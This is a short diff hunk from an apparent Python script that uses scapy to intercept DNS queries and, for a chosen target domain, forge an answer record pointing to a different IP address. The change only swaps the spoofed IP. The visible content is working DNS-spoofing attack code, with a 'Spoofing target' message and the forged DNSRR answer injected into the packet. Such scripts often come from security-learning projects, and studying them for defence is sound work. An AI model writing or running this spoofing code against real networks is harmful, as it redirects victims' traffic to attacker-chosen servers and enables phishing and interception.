@@ -14,7 +14,7 @@ def process_packet(packet):
         if target in qname:
             print(scapy_packet.show())
             print("Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="193.145.235.30")  # The other IP
+            answer = scapy.DNSRR(rrname=qname, rdata="5.39.109.120")  # The other IP
             scapy_packet[scapy.DNS].an = answer  # [.an]swer part of the DNS packet
             scapy_packet[scapy.DNS].ancount = 1  # Number of answers of the DNS response
 
